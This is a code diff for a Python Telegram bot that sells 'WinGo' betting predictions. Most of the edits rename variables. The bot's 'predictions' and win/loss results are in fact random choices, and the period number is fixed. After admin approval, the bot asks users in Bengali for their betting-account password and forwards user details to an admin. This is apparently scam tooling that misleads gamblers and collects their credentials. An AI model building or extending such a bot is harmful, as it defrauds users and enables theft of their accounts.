@@ -42,10 +42,10 @@ def get_state(uid):
         }
     return user_states[uid]
 
-def gen_period(game_mode):
+def gen_period():
     return "2026101501001"
 
-async def auto_bet_loop(uid, ctx):
+async def auto_bet_loop(uid, context):
     state = get_state(uid)
     try:
         while state["running"]:
@@ -57,7 +57,7 @@ async def auto_bet_loop(uid, ctx):
             
             if state["balance"] < current_step:
                 state["running"] = False
-                await ctx.bot.send_message(
+                await context.bot.send_message(
                     chat_id=uid,
                     text=f"❌ INSUFFICIENT BALANCE!\n\n"
                          f"আপনার বর্তমান ব্যালেন্স: {state['balance']}\n"
@@ -66,7 +66,7 @@ async def auto_bet_loop(uid, ctx):
                 )
                 break
 
-            p = gen_period(state["game"])
+            p = gen_period()
             prediction = random.choice(["BIG / GREEN", "SMALL / RED"])
             is_win = random.choice([True, False])
             result_status = "WIN (+)" if is_win else "LOSS (-)"
@@ -82,7 +82,7 @@ async def auto_bet_loop(uid, ctx):
                 f"PREDICTION GENERATED\n"
                 f"-----------------------------------------\n"
                 f"Period: {p}\n"
-                f"Game: WinGo {state['game'].upper()}\n"
+                f"Game: WinGo {str(state['game']).upper()}\n"
                 f"Current Step Bet: {current_step}\n"
                 f"Result: {prediction}\n"
                 f"Status: {result_status}\n"
@@ -91,14 +91,13 @@ async def auto_bet_loop(uid, ctx):
                 f"Next prediction in 30 seconds..."
             )
             try:
-                await ctx.bot.send_message(chat_id=uid, text=msg)
+                await context.bot.send_message(chat_id=uid, text=msg)
             except Exception as e:
                 print(f"Loop message error: {e}")
     except asyncio.CancelledError:
         pass
 
-async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    print("Received /start command!")  # রেলওয়ে লগে চেক করার জন্য
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     state = get_state(uid)
     
@@ -130,7 +129,7 @@ async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         reply_markup=InlineKeyboardMarkup(keyboard)
     )
 
-async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     username = update.effective_user.username or "No Username"
     name = update.effective_user.first_name
@@ -157,7 +156,7 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         ]]
         
         try:
-            await ctx.bot.send_message(
+            await context.bot.send_message(
                 chat_id=ADMIN_ID,
                 text=admin_text,
                 reply_markup=InlineKeyboardMarkup(admin_keyboard)
@@ -243,12 +242,12 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
                 )
                 if state.get("task"):
                     state["task"].cancel()
-                state["task"] = asyncio.create_task(auto_bet_loop(uid, ctx))
+                state["task"] = asyncio.create_task(auto_bet_loop(uid, context))
             except:
                 await update.message.reply_text("সঠিক সংখ্যা লিখুন। যেমন: 500")
             return
 
-async def callback_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     uid = query.from_user.id
@@ -270,7 +269,7 @@ async def callback_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             pass
 
         try:
-            await ctx.bot.send_message(
+            await context.bot.send_message(
                 chat_id=target_uid,
                 text="ADMIN APPROVED YOUR ACCOUNT!\n\nএখন আপনার একাউন্টের পাসওয়ার্ড দিন:"
             )
@@ -294,14 +293,14 @@ def main():
         print("BOT_TOKEN is missing!")
         return
 
-    app = ApplicationBuilder().token(BOT_TOKEN).build()
+    application = ApplicationBuilder().token(BOT_TOKEN).build()
 
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(CallbackQueryHandler(callback_handler))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
+    application.add_handler(CommandHandler("start", start))
+    application.add_handler(CallbackQueryHandler(callback_handler))
+    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
 
     print("Bot is starting polling...")
-    app.run_polling()
+    application.run_polling()
 
 if __name__ == "__main__":
     main()
